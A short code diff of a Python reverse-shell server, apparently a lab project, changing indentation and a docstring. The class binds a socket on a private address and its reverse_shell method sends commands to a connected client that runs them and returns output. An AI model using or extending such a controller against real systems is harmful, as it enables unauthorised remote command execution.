@@ -24,8 +24,8 @@ class Connection():
         accepts a connection from the client.
         """
         self.s = socket.socket(
-            socket.AF_INET,
-            socket.SOCK_STREAM
+                               socket.AF_INET,
+                               socket.SOCK_STREAM
                               )
         self.s.bind(("10.0.2.15", 8080))
         self.s.listen(1)
@@ -36,7 +36,7 @@ class Connection():
     def reverse_shell(self):
         """Asks for command to send to the shell on
         client connection. Sends command. The client's
-        code executes those commands, generated stdout
+        code executes those commands and generates stdout
         and stderr. Client sends its stdout and stderr
         back to server. Server receives packets and
         prints them to the screen until the string
